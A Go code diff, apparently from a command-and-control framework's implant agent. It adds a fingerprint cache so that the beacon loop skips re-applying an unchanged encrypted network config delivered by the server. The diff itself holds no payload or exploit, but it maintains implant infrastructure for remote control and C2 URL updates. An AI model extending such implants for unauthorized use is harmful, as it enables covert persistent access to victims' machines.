@@ -413,6 +413,14 @@ func mergeServerC2URL(primary string, existing []string) []string {
 	return merged
 }
 
+// lastNetworkConfigFingerprint is the plaintext fingerprint of the config the
+// agent applied last. The periodic server refresh re-sends the same config
+// (with a fresh nonce) every 15 minutes; comparing fingerprints avoids
+// rewriting the persisted blob and re-parsing the network stack for nothing.
+// Only the beacon loop (and startup) calls applyServerNetworkConfig, so a
+// plain string is enough.
+var lastNetworkConfigFingerprint string
+
 // applyServerNetworkConfig decrypts and applies a server-delivered network
 // config (config-over-wire). The blob is AES-256-GCM under the per-implant
 // registration secret; only a server holding that secret could have produced it,
@@ -433,6 +441,11 @@ func applyServerNetworkConfig(b64 string) {
 	nc, err := protocol.DecryptNetworkConfig(secret, b64)
 	if err != nil {
 		logDebug("[config] network config decrypt failed, keeping defaults")
+		return
+	}
+	fingerprint := protocol.NetworkConfigFingerprint(nc)
+	if fingerprint != "" && fingerprint == lastNetworkConfigFingerprint {
+		// Same live config as last time: the periodic refresh has nothing to do.
 		return
 	}
 	c2URL := strings.TrimSpace(nc.C2URL)
@@ -495,6 +508,7 @@ func applyServerNetworkConfig(b64 string) {
 		C2URL = strings.Join(mergedURLs, ",")
 	}
 	reparseNetworkConfig()
+	lastNetworkConfigFingerprint = fingerprint
 	if err := saveNetworkConfig(b64); err != nil {
 		logDebug("[config] failed to persist network config")
 	} else {
